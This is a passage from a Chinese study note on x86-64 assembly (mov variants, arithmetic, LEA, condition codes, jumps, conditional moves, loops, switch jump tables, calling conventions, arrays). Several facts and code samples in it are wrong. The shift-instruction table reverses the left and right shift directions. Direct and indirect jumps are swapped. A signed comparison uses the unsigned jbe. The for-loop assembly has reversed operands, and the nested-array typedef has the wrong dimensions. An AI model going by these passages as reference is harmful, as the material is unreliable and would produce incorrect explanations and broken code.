条指令了，再加上双字的符号扩展，就有 11 种类型了。</p><table><thead><tr><th>指令MOV S,R</th><th>描述</th></tr></thead><tbody><tr><td>movzbw</td><td>从字节零扩展到字</td></tr><tr><td>movzbl</td><td>从字节零扩展到双字</td></tr><tr><td>movzbq</td><td>从字节零扩展到四字</td></tr><tr><td>movzwl</td><td>从字零扩展到双字</td></tr><tr><td>movzwq</td><td>从字零扩展到四字</td></tr><tr><td>movsbw</td><td>从字节符号扩展到字</td></tr><tr><td>movsbl</td><td>从字节符号扩展到双字</td></tr><tr><td>movsbq</td><td>从字节符号扩展到四字</td></tr><tr><td>movswl</td><td>从字符号扩展到双字</td></tr><tr><td>movswq</td><td>从字符号扩展到四字</td></tr><tr><td>movslq</td><td>从双字符号扩展到四字</td></tr></tbody></table><p>这里其实也是很好记的，就是mov后面多三个后缀嘛，第一个字表示符号扩展（s）还是零扩展（z），第二个字符表示源操作数字长（字节b，字w，双字l），三个字符表示目的操作数字长（字w，双字l，四字q），这样就好记多了。</p><p>关于符号扩展和零扩展的区别，其实很简单，若源操作数是正数，也就是说在它字的范围内最高位为 0，符号扩展和零扩展是一样的，把高位无脑填 0 即可，如果从有符号角度来看为负数，也就是说在它字的范围内最高位为 1，符号扩展则会把高位全部填充为 1，而零扩展还是把高位填充为 0。</p><h5 id="入栈（push），出栈（pop）指令"><a href="#入栈（push），出栈（pop）指令" class="headerlink" title="入栈（push），出栈（pop）指令"></a>入栈（push），出栈（pop）指令</h5><p>这两个指令本质也是数据传送指令，只不过它们只对栈进行操作。</p><p>push 是入栈指令，push S 的作用是把栈抬高八个字节（视操作系统位数而定），再将源操作数 S 放入开辟出来的栈空间中。</p><p>pop 是出栈指令，pop D 的作用是把内存栈顶的八个字节数据传送到目的操作数 D 当中，再将栈降低八个字节。</p><p>这里需要注意的是，这里的源操作数和目的操作数均不能为内存地址，因为 push 的目的操作数已经是栈里面的内存了，如果源操作数也是内存就违反了规定， Intel 是不允许我们直接将两个内存地址进行交换的，pop 同理，因此 push 的源操作数只能是立即数或者是寄存器， pop 的目的操作数只能是寄存器。</p><h4 id="算数和逻辑操作"><a href="#算数和逻辑操作" class="headerlink" title="算数和逻辑操作"></a>算数和逻辑操作</h4><p>对于计算机来说，最重要的当然还是进行数据运算啦，我们一般运算就分为算数运算和逻辑运算，当然还有浮点运算，不过那个过于复杂我们不讨论，我们只讨论前两个。</p><h5 id="一元运算"><a href="#一元运算" class="headerlink" title="一元运算"></a>一元运算</h5><table><thead><tr><th>指令</th><th>效果</th></tr></thead><tbody><tr><td>INC D</td><td>自增（D++）</td></tr><tr><td>DEC D</td><td>自减（D–）</td></tr><tr><td>NEG D</td><td>取负（-D）</td></tr><tr><td>NOT D</td><td>取反（~D）</td></tr></tbody></table><p>这四条指令比较简单，不做详细分析</p><h5 id="二元运算"><a href="#二元运算" class="headerlink" title="二元运算"></a>二元运算</h5><table><thead><tr><th>指令</th><th>效果</th></tr></thead><tbody><tr><td>ADD S,D</td><td>D+=S</td></tr><tr><td>SUB S,D</td><td>D-=S</td></tr><tr><td>IMUL S,D</td><td>D*=S（有符号）</td></tr><tr><td>MUL S,D</td><td>D*=S（无符号）</td></tr><tr><td>IDIV S,D</td><td>D/=S（有符号）</td></tr><tr><td>DIV S,D</td><td>D/=S（无符号）</td></tr><tr><td>XOR S,D</td><td>D^=S</td></tr><tr><td>OR S,D</td><td>D|=S</td></tr><tr><td>AND S,D</td><td>D&amp;=S</td></tr><tr><td>SAL S,D</td><td>D&gt;&gt;=S（有符号）</td></tr><tr><td>SAR S,D</td><td>D&lt;&lt;=S（有符号）</td></tr><tr><td>SHL S,D</td><td>D&gt;&gt;=S（无符号）</td></tr><tr><td>SHR S,D</td><td>D&lt;&lt;=S（无符号）</td></tr></tbody></table><p>这里需要注意：当左移右移的源操作数超过目的操作数的位数（w），那么它只会取得低 log2(w) （向上取整）位。</p><p>这些指令也有 b,w,l,q 的区别。</p><h5 id="加载有效地址（Load-Effective-Address）"><a href="#加载有效地址（Load-Effective-Address）" class="headerlink" title="加载有效地址（Load Effective Address）"></a>加载有效地址（Load Effective Address）</h5><p>lea指令用于加载有效地址，它其实就是 mov 指令的一个变形，用最直观的理解去讲，就是如果我 movq 8[%rdi,8,%rsi],%rax 的作用应该是把内存 %rdi+8*%rsi+8 这地址的八个字节给到 %rax 寄存器，而 简简单单把 movq 换成 leaq，就是不取值了，直接把算出来的地址，这个地址给到 %rax 寄存器。</p><p>它一般用于简单的计算比较多，比如以下代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mul</span><span class="params">(<span class="keyword">long</span> x,<span class="keyword">long</span> y)</span></span>&#123;</span><br><span class="line"><span class="comment">//x in %rdi,y in %rsi</span></span><br><span class="line"><span class="keyword">return</span> x+<span class="number">4</span>*y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们直接翻译成汇编是什么样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">mul proc</span><br><span class="line">subq $10h,%rsp</span><br><span class="line">movq %rsi,%rax</span><br><span class="line">imulq $4,%rax</span><br><span class="line">addq %rdi,%rax</span><br><span class="line">addq %10h,%rsp</span><br><span class="line">retq</span><br><span class="line">mul endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>当然我们目前学了这么多的知识也就允许我们写成这样了，但是如果我们用 LEA 指令就能大大缩短代码量，LEA 指令我们可以这么写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">mul proc</span><br><span class="line">subq $10h,%rsp</span><br><span class="line">leaq (%rdi,4,%rsi),%rax</span><br><span class="line">addq %10h,%rsp</span><br><span class="line">retq</span><br><span class="line">mul endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>没错，就这么简单了，所以我们一般用 LEA 指令最多只是用一些简单的运算，或者我本来想取一个全局变量的内存地址，但是我如果直接 mov 就变成了取它的值，于是我改用 LEA 指令就能取到它的地址了，我目前能理解的也只有这两种情况了。</p><h3 id="控制"><a href="#控制" class="headerlink" title="控制"></a>控制</h3><p>然而，单一的顺序结构并不能满足我们的需求，我们希望程序在某些时候有所选择，希望某些时候去做重复的工作，这个时候程序将不再是顺序执行，而是会跳转执行。</p><p>跳转分条件跳转和无条件跳转，无条件跳转执行之后，则程序必定跳转到它指定的位置。如果是这样，那么程序运行与之前的顺序运行没什么区别，要实现分支结构和循环结构就需要用到条件跳转了。</p><h4 id="条件码"><a href="#条件码" class="headerlink" title="条件码"></a>条件码</h4><p>在CPU当中，除了维护了 16 个整数寄存器外，我们还维护了一些状态寄存器（也称标志寄存器）。</p><p>常见的标志寄存器有</p><ul><li>CF：进位标记，是否产生了进位</li><li>ZF：零标记，最近得到的操作结果为0</li><li>SF：符号标记，最近得到了一个负数结果</li><li>OF：溢出标志，最近的操作导致一个补码溢出</li></ul><p>LEA 指令不会改变任何标志寄存器，INC 和 DEC 指令不会改变进位标志，有两个指令它们只改变标志位而不改变其它寄存器，那就是 cmp 指令和 test 指令。cmp 指令会与 sub 指令设置一样的标志位，但是不会改变目的操作数，test 指令则与 and 指令一样，但是也不会修改目的操作数，test 指令的常见用法就是 test %rax,%rax 来判断 %rax 的情况，当然这也可以看做是 cmp 0,%rax，与零做比较，又或者是进行掩码的与操作，根据结果判断某个标志位是否被设置。</p><h4 id="访问条件码"><a href="#访问条件码" class="headerlink" title="访问条件码"></a>访问条件码</h4><p>条件码不会被直接读取，它一般用于条件跳转，条件设置和条件转移，它们一般有如下后缀。</p><table><thead><tr><th>指令后缀</th><th>同义后缀</th><th>条件码</th><th>设置条件</th><th>英文释义</th></tr></thead><tbody><tr><td>e</td><td>z</td><td>ZF==1</td><td>相等（零）</td><td>equal（zero）</td></tr><tr><td>ne</td><td>nz</td><td>ZF==0</td><td>不相等（不为零）</td><td>not equal（not zero）</td></tr><tr><td>s</td><td>/</td><td>SF==1</td><td>为负数</td><td>sign（with -）</td></tr><tr><td>ns</td><td>/</td><td>SF==0</td><td>为非负数</td><td>not sign（without -）</td></tr><tr><td>g</td><td>nle</td><td>(SF^OF)==0&amp;ZF==0</td><td>有符号大于</td><td>greater（not [less or equal]）</td></tr><tr><td>ge</td><td>nl</td><td>(SF^OF)==0</td><td>有符号大于等于</td><td>greater or equal（not less）</td></tr><tr><td>l</td><td>nge</td><td>(SF^OF)==1</td><td>有符号小于</td><td>less （not [greater or equal]）</td></tr><tr><td>le</td><td>ng</td><td>(SF^OF)==1|ZF</td><td>有符号小于等于</td><td>less or equal （not greater）</td></tr><tr><td>a</td><td>nbe</td><td>CF==0&amp;ZF==0</td><td>无符号大于</td><td>above （not [below or equal]）</td></tr><tr><td>ae</td><td>nb</td><td>CF==0</td><td>无符号大于等于</td><td>above or equal （not below）</td></tr><tr><td>b</td><td>nae</td><td>CF==1</td><td>无符号小于</td><td>below （not [above or equal]）</td></tr><tr><td>be</td><td>na</td><td>CF|ZF==1</td><td>无符号小于等于</td><td>below or equal （not above）</td></tr></tbody></table><p>这里比较复杂的大概就是有符号和无符号大小于了吧，但是其实只要理解到位是不难记的。</p><h4 id="set指令"><a href="#set指令" class="headerlink" title="set指令"></a>set指令</h4><p>set 指令用于设置一个字节为全 1，它可以加入上述表中的条件后缀以用于条件设置。</p><h4 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h4><p>无条件跳转可以使用直接跳转或者间接跳转，直接跳转比如 jmp *%rax，间接跳转就是对 %rax 所存的地址再次取值所得到的地址作为新的指令执行地址。</p><p>条件跳转指令的指令名称为 j + 条件后缀，比如 je 指令就是等于时跳转，条件跳转指令只能直接跳转，不能间接跳转。</p><h4 id="跳转指令的编码"><a href="#跳转指令的编码" class="headerlink" title="跳转指令的编码"></a>跳转指令的编码</h4><p>跳转指令表面上是要指定一个绝对地址，但是实际上编码的时候是采用了偏移量的方式去编码，它会根据跳转指令所编码的值去对自己的 %rip 寄存器加或者是减去一个偏移量，但是需要注意的是，偏移量是从下一条指令开始计算的，这也就是为什么 jmp 如果后面编码值为 0 不会产生一个死循环。</p><h4 id="条件控制语句实现条件分支"><a href="#条件控制语句实现条件分支" class="headerlink" title="条件控制语句实现条件分支"></a>条件控制语句实现条件分支</h4><p>比如这样的一个语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="comment">//x in %rdi,y in %rsi</span></span><br><span class="line"><span class="keyword">if</span>(x&gt;y)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们可以这样子写汇编语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.code</span><br><span class="line">cmp proc</span><br><span class="line">mov $0,%rax</span><br><span class="line">cmp %rsi,%rdi</span><br><span class="line">jbe L1</span><br><span class="line">mov $1,%rax</span><br><span class="line">L1:</span><br><span class="line">ret</span><br><span class="line">cmp endp</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>如果有 if … else … 语句的话，一般采用条件跳转和无条件跳转组合的方式去实现，比如如下的表达式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(expr)&#123;</span><br><span class="line">truepart</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">falsepart</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们进行编译之后大概率会产生如下的汇编语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">test %rdi,%rdi</span><br><span class="line">jz L1</span><br><span class="line">//truepart</span><br><span class="line">jmp done</span><br><span class="line">L1:</span><br><span class="line">//falsepart</span><br><span class="line">done:</span><br><span class="line">//over</span><br></pre></td></tr></table></figure><h4 id="条件传送语句实现条件分支"><a href="#条件传送语句实现条件分支" class="headerlink" title="条件传送语句实现条件分支"></a>条件传送语句实现条件分支</h4><p>条件传送指令就和上面两类条件指令一模一样，符合条件时传送，不符合条件时不传送。</p><p>同样，如下语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//x in %rdi,y in %rsi</span></span><br><span class="line">    <span class="keyword">int</span> z;</span><br><span class="line">    <span class="keyword">if</span>(x&gt;y)&#123;</span><br><span class="line">        z=x-y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        z=y-x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> z</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用条件跳转语句可以很轻松地实现上述逻辑，但是我们也可以使用条件传送语句，事先算出两个部分 z 的值，先赋值假设正确的值，再用条件传送语句判断错误的条件赋值。</p><p>比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">movq %rdi,%rax</span><br><span class="line">subq %rsi,%rax;let %rax=x-y</span><br><span class="line">movq %rsi,%rbx</span><br><span class="line">subq %rdi,%rbx;let %rbx=y-x</span><br><span class="line">cmp %rsi,%rdi</span><br><span class="line">cmovle %rbx,%rax;if x&lt;=y movq %rbx,%rax</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>可能你会疑问，这样子效率会不会遍低，因为如果运算更复杂一点，我需要把两个值都算出来，执行的指令会变多。确实，条件跳转比条件转移比起来执行的指令少，而且能泛用性广，举个例子：如果 if … else … 里面有其它语句，比如输出语句，那么我们条件传送指令显然就不能用，而条件跳转能应对这种情况。</p><p>但是条件传送实现的条件分支比条件转移实现的分支运行速度快。你可能很惊讶，为什么执行的指令多反而运行速度还快了，那是因为当今的 CPU 都是流水作业，一个指令的执行分为五个步骤，它同一时间可以执行五条指令对应的不同操作。而流水作业的前提条件是我能清楚地知道我接下来要执行的代码，如果我都不知道我接下来要执行什么代码，那么我肯定不能很好的运用流水作业了。</p><p>条件控制语句在执行完毕之前，谁也不知道它是跳转或者不跳转，也就无法知道它接下来要执行的指令，我们只能选择等待条件跳转指令执行完毕再次填充指令流水作业，速度自然就慢了。而条件转移并不改变指令的执行顺序，因此它依然能利用 CPU 的流水作业。</p><table><thead><tr><th>实现分支的方式</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>条件跳转</td><td>能应对所有分支情况，执行的指令较少</td><td>执行速度慢，不能很好的利用CPU的指令流水</td></tr><tr><td>条件传送</td><td>执行速度快，能很好的利用CPU的流水作业</td><td>不能应对所有的分支状况，需要把所有的情况提前计算，执行的指令较多</td></tr></tbody></table><h3 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h3><p>高级语言中，除了顺序，选择以外，还有一种结构就是循环结构了，但是事实上我们依然可以通过条件转移的方式实现循环的效果，例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">movq $10,%rcx;set loop time</span><br><span class="line">do:</span><br><span class="line">;do something</span><br><span class="line">subq $1,%rcx</span><br><span class="line">test %rcx,%rcx</span><br><span class="line">jns do</span><br></pre></td></tr></table></figure><p>以上例程可以循环10次执行，并且可以通过修改立即数 $10 来改变循环次数。</p><p>把它转为 C 语言来写就很像我们的 do-while 循环语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line"><span class="comment">//something</span></span><br><span class="line">        i--;</span><br><span class="line">&#125;<span class="keyword">while</span>(i&gt;=<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么除了 do - while 我们还有 while，for 三种类型的循环。</p><p>它们的模板分别是什么样的呢，我们来看看。</p><p>while 的 C 写法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//something</span></span><br><span class="line">        i--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">movq $10,%rcx</span><br><span class="line">do:</span><br><span class="line">    subq $1,%rcx</span><br><span class="line">    test %rcx,%rcx</span><br><span class="line">    js end</span><br><span class="line">;do something</span><br><span class="line">jmp do</span><br><span class="line">end:</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>for 的 C 写法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line"><span class="comment">//something</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的汇编代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">movq %rcx,0</span><br><span class="line">do:</span><br><span class="line">;something</span><br><span class="line">addq %rcx,$1</span><br><span class="line">cmpq $10,%rcx</span><br><span class="line">jl do</span><br></pre></td></tr></table></figure><p>如果循环语句中有 continue，我们就跳过循环体中的所有逻辑，直接到循环条件判断和循环变量的修改，如果有 break 我们直接跳出循环即可。</p><p>要点：<strong>掌握循环结构的写法和循环的判断</strong>。</p><h4 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h4><p>其实有人说，switch 就可以理解为  if elseif else if … 的形式，其实从实现来说，两者并没有太大的差别，但是执行效率上会有巨大差别，如果语句在第 n+1 个条件成立了，那么程序进行了 n+1 次判断。而 switch 语句在多数情况下（case语句超过四条，值的跨度小）并没有使用条件转移来区分各个值之间的跳转，当然它会区分一般值和默认值（default），一般值我们使用跳转表的形式实现。</p><p>比如如下的语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> test&#123;</span><br><span class="line">    <span class="keyword">long</span> val=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">switch</span>(n)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            val+=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            val-=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            val*=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            val-=<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            val++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将它翻译为汇编语言之后可能会出现这样的逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">.L1:</span><br><span class="line">.quad .L2</span><br><span class="line">.quad .L3</span><br><span class="line">.quad .L4</span><br><span class="line">.quad .L5</span><br><span class="line">.quad .L6</span><br><span class="line"></span><br><span class="line">test proc:</span><br><span class="line">movq $1,%rax</span><br><span class="line">subq $1,%rdi</span><br><span class="line">cmpq $3,%rdi</span><br><span class="line">ja L6</span><br><span class="line">jmp *.L1(,%rdi,8)</span><br><span class="line">L2:</span><br><span class="line">addq $2,%rax</span><br><span class="line">jmp end</span><br><span class="line">L3: </span><br><span class="line">subq $2,%rax</span><br><span class="line">jmp end</span><br><span class="line">L4:</span><br><span class="line">mul $2,%rax</span><br><span class="line">jmp end</span><br><span class="line">L5:</span><br><span class="line">div $2,%rax</span><br><span class="line">jmp end</span><br><span class="line">L6:</span><br><span class="line">addq $1,%rax</span><br><span class="line">end:</span><br><span class="line">ret</span><br><span class="line">test endp</span><br></pre></td></tr></table></figure><p>我们可以看到跳转表的一个优势所在，对于每一个条件，都可以只进行一次判断就跳转到指定位置运行，当然我们实际在用的时候，可能会出现空语句，或者是滑落的情况（即语句下面没有 break），如果出现滑落，我们就删除对应语句块的 jmp 命令，如果出现空语句（case 后面没有语句），我们不新增加标签，而是直接设置跳转表的位置为下一个有值的标签。</p><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>过程是软件中一个很重要的抽象，它提供了一种封装代码的方式，用一组参数和返回值实现了某种功能，然后我们可以在程序中不同的地方调用这个函数。</p><h4 id="运行时栈"><a href="#运行时栈" class="headerlink" title="运行时栈"></a>运行时栈</h4><p>C 语言调用机制的一个关键特性就是使用了栈结构提供的后进先出的管理原则。当 P 调用 Q 的时候，我们需要暂时保存 P 函数调用之前的一个状态，在调用完成之后予以恢复状态，当然，除了 %rax 寄存器，因为它需要返回值。</p><p>当 x86-64 过程需要的局部变量超出了我们所可以使用的寄存器时，函数就会选择在栈上开辟空间用于保存局部变量，这个局部变量的部分以及一些被保存的寄存器部分就是我们这个函数的栈帧。</p><h4 id="转移控制"><a href="#转移控制" class="headerlink" title="转移控制"></a>转移控制</h4><p>在调用函数的时候，我们需要让 %rip 寄存器到我们调用的函数代码段，调用结束之后，我们又需要让它返回原来的函数，因此这里就需要我们的 CALL 指令，CALL 指令也是无条件跳转指令，只是在跳转之前会增加一步，将当前的 %rip 压入栈中，等到被调用函数执行 ret 指令的时候，栈会把栈顶所保存的 <strong>返回地址</strong> 给到 %rip 寄存器。</p><p>建议跟则书上的图走一遍会理解更深刻。</p><h4 id="数据传送"><a href="#数据传送" class="headerlink" title="数据传送"></a>数据传送</h4><p>调用过程的时候，我们除了要交与控制权以外，我们还需要给定对应的参数，因此这里我们需要知道给函数传递对应的参数的方法。</p><p>重要知识，建议背诵：<strong>x86-64架构的函数调用传递参数的方式为：前六个参数分别传递给寄存器 %rdi,%rsi,%rdx,%rcx,%r8,%r9，若还有剩余参数，剩余参数从右往左依次入栈。</strong></p><h4 id="栈上的局部存储"><a href="#栈上的局部存储" class="headerlink" title="栈上的局部存储"></a>栈上的局部存储</h4><p>除了寄存器不足以存放所有本地数据时会开栈空间来存放以外，如果对变量进行了引用，即取址操作（&amp;），这个变量也必须放入栈中，栈开辟的局部存储会在函数调用结束的时候被释放掉。</p><h4 id="寄存器的局部存储"><a href="#寄存器的局部存储" class="headerlink" title="寄存器的局部存储"></a>寄存器的局部存储</h4><p>一般情况下，如果局部变量比较少，局部变量都将被保存在寄存器当中，那么发生调用的时候，我们应该如何保存寄存器中的局部变量呢？第一种方法就是被调用函数不去动这些寄存器，调用结束之后那还是原来的值，也没有关系。但是如果被调用函数也需要使用这些寄存器呢？我们就只能先把它保存在栈中，等到结束的时候再去读取。</p><p>惯例中：%rbx,%rbp,%r12~%r15 被划分为被调用者保存寄存器，就是调用者不需要去管它，要相信被调函数会为你保存好这一切内容。当然其它的寄存器中，除了 %rsp 就都属于调用者需要保存的寄存器，被调函数在用这些寄存器的时候会认为调用者已经保存好了，自己无需保存可以直接修改寄存器。</p><h3 id="数组的分配与访问"><a href="#数组的分配与访问" class="headerlink" title="数组的分配与访问"></a>数组的分配与访问</h3><p>C语言的数组是一种将标量数据聚集为更大的数据类型的方式。</p><h4 id="基本原则"><a href="#基本原则" class="headerlink" title="基本原则"></a>基本原则</h4><p>数组 type A[n] 所占用的字节数 sizeof(A)=sizeof(type)<em>n，我们要访问 A[i] 时，实际是访问内存地址为 XA+i</em>sizeof(type) 的元素。</p><h4 id="指针运算"><a href="#指针运算" class="headerlink" title="指针运算"></a>指针运算</h4><p>C语言允许对指针直接运算，但是指针与整数的加减被重载过， p+i 相当于 Xp+i*sizeof(type) 的地址（Xp 表示数组 p 的基地址）。</p><h4 id="嵌套数组"><a href="#嵌套数组" class="headerlink" title="嵌套数组"></a>嵌套数组</h4><p>当我们定义了一个 int A[3][5] 时，相当于做了如下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> <span class="keyword">row3_t</span>[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">row3_t</span> A[<span class="number">5</span>];</span><br></pre></td></tr></table></figure><p>对于数组 A[N][M] 来说，A[i][j] 相当于访问内存地址为 XA+i*sizeof(int)<em>M+j</em>sizeof(int) 的元素。</p><h3 id="异质的数据结构"><a href="#异质的数据结构" class="headerlink" title="异质的数据结构"></a>异质的数据结构</h3><h4 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h4><p>C语言会用一个 Struct 声明创建一个数据类型，将可能不同类型的基本数据聚和到一个对象当中，用名字来引用结构的各个部分。编译器对结构体处理时会记录每个变量名在结构体当中的偏移，对应使用时找到相对应的内存地址取出元素。</p><p>对于 C 语言而言，为了方便内存管理会对数据类型做出这样的规定：大小为 n(n&lt;=8) 的数据必须对齐在地址为 n 的倍数上，如果当前地址不符合要求则会往后顺延，中间的内存可能会因为填充产生浪费。</p><p>考虑如下结构体的声明：</p><figure 